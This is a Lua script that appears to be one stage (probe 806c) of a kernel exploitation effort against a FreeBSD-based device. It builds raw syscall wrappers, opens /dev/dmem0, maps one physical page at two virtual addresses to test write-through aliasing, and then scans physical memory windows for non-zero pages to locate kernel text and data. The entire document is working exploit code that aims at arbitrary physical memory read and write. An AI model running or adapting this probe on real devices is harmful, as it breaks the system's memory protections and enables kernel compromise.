-- CRASH_CLASS: HIGH
-- PROBE 806c: is a dmem0 mapping the real physical page, or a fresh anonymous object?
--
-- 806b could not tell: every aligned phys mapped, and every page read zero.  The decisive test
-- is aliasing.  Map one physical address at two virtual addresses, write through one and read
-- through the other.  If they alias, dmem0 gives arbitrary physical R/W and the scan that follows
-- looks for non-zero physical pages (kernel text and data live below the aperture by default).
print("=== PROBE 806c: DMEM0 ALIASING AND PHYSICAL SCAN ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
pcall(function() return getpid() end)
local s = "/dev/dmem0"
local cpath = memory.alloc(32)
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[0] fd=" .. fd)

local function map_at(va, phys)
    pcall(function() return sc_munmap(uint64(va), uint64(0x4000)) end)
    local ok, r = pcall(function()
        return sc_mmap(uint64(va), uint64(0x4000), uint64(0x33), uint64(0x11),
            uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then return false end
    return to_num(r) == va
end
local function unmap(va) pcall(function() return sc_munmap(uint64(va), uint64(0x4000)) end) end

local VA1, VA2 = 0x880000000, 0x890000000
local P = 0x110000000
print("")
print("[1] aliasing test at phys 0x" .. string.format("%X", P))
local a1 = map_at(VA1, P)
local a2 = map_at(VA2, P)
print("  map1=" .. tostring(a1) .. " map2=" .. tostring(a2))
if a1 and a2 then
    wd(VA1 + 0x40, 0xDEADBEEF)
    wd(VA1 + 0x44, 0x12345678)
    local v1 = rd(VA2 + 0x40)
    local v2 = rd(VA2 + 0x44)
    print(string.format("  write 1: VA1+0x40=DEADBEEF VA2+0x40=%s %s", string.format("%08X", v1 or 0),
        (v1 == 0xDEADBEEF) and "ALIAS" or "not-aliased"))
    print(string.format("  write 2: VA1+0x44=12345678 VA2+0x44=%s", string.format("%08X", v2 or 0)))
    wd(VA2 + 0x80, 0xCAFEBABE)
    local v3 = rd(VA1 + 0x80)
    print(string.format("  reverse: VA2+0x80=CAFEBABE VA1+0x80=%s", string.format("%08X", v3 or 0)))
end
unmap(VA1); unmap(VA2)

print("")
print("[2] scanning physical windows for non-zero pages (first qword)")
local windows = {
    {0x0, 0x2000000, 0x4000},
    {0x2000000, 0x10000000, 0x100000},
    {0x100000000, 0x118000000, 0x100000},
}
for wi, w in ipairs(windows) do
    local start, stop, step = w[1], w[2], w[3]
    local nz, total, examples = 0, 0, {}
    local p = start
    while p < stop do
        if map_at(VA1, p) then
            total = total + 1
            local lo = rd(VA1)
            local hi = rd(VA1 + 4)
            if (lo or 0) ~= 0 or (hi or 0) ~= 0 then
                nz = nz + 1
                if #examples < 8 then
                    examples[#examples + 1] = string.format("%X=%08X%08X", p, hi or 0, lo or 0)
                end
            end
            unmap(VA1)
        end
        p = p + step
    end
    print(string.format("  window %d [%X,%X) step %X: mapped=%d nonzero=%d", wi, start, stop, step, total, nz))
    if #examples > 0 then print("    " .. table.concat(examples, " ")) end
end
print("")
print("[3] alive pid=" .. to_num(getpid()))
